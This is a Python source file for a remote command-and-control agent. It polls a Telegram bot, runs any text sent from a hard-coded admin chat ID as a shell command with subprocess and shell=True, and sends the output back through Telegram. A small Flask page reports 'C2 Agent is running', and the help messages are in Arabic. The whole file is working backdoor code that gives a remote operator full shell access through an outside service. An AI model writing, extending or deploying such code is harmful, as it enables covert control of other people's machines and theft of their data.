import time
import os
import subprocess
import requests
import threading
from flask import Flask

TOKEN = os.environ.get("TELEGRAM_TOKEN")
admin_env = os.environ.get("ADMIN_CHAT_ID")
ADMIN_ID = int(admin_env) if admin_env and admin_env.isdigit() else 2086562822

URL = f"https://api.telegram.org/bot{TOKEN}"
CWD = os.getcwd()
ALIVE = True

app = Flask(__name__)

@app.route("/")
def index():
    return "C2 Agent is running successfully!", 200

def get_updates(offset=None):
    try:
        r = requests.get(f"{URL}/getUpdates",
                         params={"timeout": 30, "offset": offset}, timeout=35)
        return r.json()
    except Exception:
        return None

def send(chat_id, text):
    try:
        requests.post(f"{URL}/sendMessage",
                      json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
    except Exception:
        pass

def exec_cmd(cmd):
    global CWD
    try:
        parts = cmd.split(None, 1)
        base = parts[0].lower()

        if base == "cd":
            d = parts[1].strip() if len(parts) > 1 else os.path.expanduser("~")
            os.chdir(os.path.abspath(os.path.join(CWD, d)))
            CWD = os.getcwd()
            return f"المجلد الحالي: {CWD}"

        if base == "pwd":
            return CWD

        if base in ("exit", "shutdown"):
            global ALIVE
            ALIVE = False
            return "تم إيقاف العملية."

        proc = subprocess.run(cmd, shell=True, capture_output=True,
                              text=True, cwd=CWD, timeout=120)
        return (proc.stdout + proc.stderr) or "تم بنجاح (لا مخرجات)."
    except subprocess.TimeoutExpired:
        return "انتهت مهلة التنفيذ (أكثر من 120 ثانية)."
    except Exception as e:
        return f"خطأ: {e}"

def handle(chat_id, user_id, msg):
    if user_id != ADMIN_ID:
        send(chat_id, "غير مصرّح.")
        return

    text = msg.get("text", "")
    if not text.strip():
        return

    if text.startswith("/"):
        parts = text.split(None, 1)
        c, arg = parts[0], (parts[1] if len(parts) > 1 else "").strip()
        if c == "/cd" and arg:
            return send(chat_id, exec_cmd("cd " + arg))
        if c == "/pwd":
            return send(chat_id, exec_cmd("pwd"))
        if c == "/kill":
            global ALIVE
            ALIVE = False
            return send(chat_id, "أوقفت العملية.")
        if c == "/help":
            return send(chat_id,
                "الأوامر المتاحة:\n"
                "`/pwd`  عرض المجلد الحالي\n"
                "`/cd dir`  تغيير المجلد\n"
                "`/kill`  إيقاف العملية\n"
                "أي نص آخر يُنفَّذ مباشرة كأمر في النظام."
            )
        return send(chat_id, exec_cmd(text[1:]))

    output = exec_cmd(text)
    if len(output) > 4000:
        output = output[:4000] + "\n[... تم القطع ...]"
    send(chat_id, f"```\n$ {text}\n{output}\n```")

def c2_loop():
    global ALIVE, CWD
    # إلغاء أي Webhook قديم فَعّله تليجرام لكي يعمل النظام بنجاح
    try:
        requests.get(f"{URL}/deleteWebhook")
    except Exception:
        pass

    offset = None
    while ALIVE:
        data = get_updates(offset)
        if data and data.get("result"):
            for u in data["result"]:
                offset = u["update_id"] + 1
                m = u.get("message")
                if not m:
                    continue
                chat_id = m["chat"]["id"]
                user_id = m["from"]["id"]
                handle(chat_id, user_id, m)
        time.sleep(2)

if __name__ == "__main__":
    threading.Thread(target=c2_loop, daemon=True).start()
    
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
